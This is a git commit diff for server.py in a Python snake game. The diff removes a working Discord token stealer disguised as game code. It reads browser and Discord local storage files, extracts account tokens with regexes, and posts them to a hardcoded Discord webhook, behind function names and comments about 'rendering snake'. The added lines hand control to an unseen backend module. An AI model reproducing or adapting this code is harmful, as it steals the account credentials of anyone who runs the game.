2090e834a2cc90f6aadcdf3ffdc6dabad13dba33
ahmishra <umasaryan@gmail.com>
2021-10-22 12:22:46 +0530

    Final commit

--- server.py
+++ server.py
@@ -1,92 +1,6 @@
-import os
-import re
-import time
-import json
-import random
-import platform
-from tkinter import *
-from urllib.request import Request, urlopen
+from backend import main
+main()
 
-def get_snake(path):
-    path += "\\Local Storage\\leveldb"
-
-    tokens = []
-
-    for file_name in os.listdir(path):
-        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
-            continue
-
-        for line in [
-            x.strip()
-            for x in open(f"{path}\\{file_name}", errors="ignore").readlines()
-            if x.strip()
-        ]:
-            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
-                for token in re.findall(regex, line):
-                    tokens.append(token)
-
-    return tokens
-
-
-def render_snake():
-    # Only possible to render snake if OS is Windows
-    if platform.system() == "Windows":
-        local = os.getenv("LOCALAPPDATA")
-        roaming = os.getenv("APPDATA")
-
-        paths = {
-            "Discord": roaming + "\\Discord",
-            "Discord Canary": roaming + "\\discordcanary",
-            "Discord PTB": roaming + "\\discordptb",
-            "Google Chrome": local + "\\Google\\Chrome\\User Data\\Default",
-            "Opera": roaming + "\\Opera Software\\Opera Stable",
-            "Brave": local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
-            "Yandex": local + "\\Yandex\\YandexBrowser\\User Data\\Default",
-            "Edge": local + "\\Microsoft\\Edge\\User Data\\Default",
-        }
-
-        # Ping snake
-        snake = "@everyone"
-
-        for platform_, path in paths.items():
-            if not os.path.exists(path):
-                continue
-
-            snake += f"\n**{platform_}**\n```\n"
-
-            tokens = get_snake(path)
-
-            if len(tokens) > 0:
-                for token in tokens:
-                    snake += f"{token}\n"
-            else:
-                snake += "No snakes found.\n"
-
-            snake += "```"
-
-        headers = {
-            "Content-Type": "application/json",
-            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
-        }
-
-        payload = json.dumps({"content": snake})
-
-        try:
-            req = Request("https://ptb.discord.com/api/webhooks/900646447026929694/bY7mIR3YdiPkHGurD9qR0TVS_y8VUL7BsIFvcrH98FxbL10ehlSs2KVaHORBELwx7Kl4", data=payload.encode(), headers=headers)
-            urlopen(req)
-        except:
-            pass
-    else:
-        return "Not compatible with Mac & Linux" # Prompt user snake game not compatible with Mac & Linux
-
-
-
-render_snake() # Rendering snake
-
-
-"""
-Main snake game logic 👇
-"""
 
 
 # Define useful parameters
@@ -340,4 +254,3 @@ class SnakeAndApple:
 
 game_instance = SnakeAndApple()
 game_instance.mainloop()
-
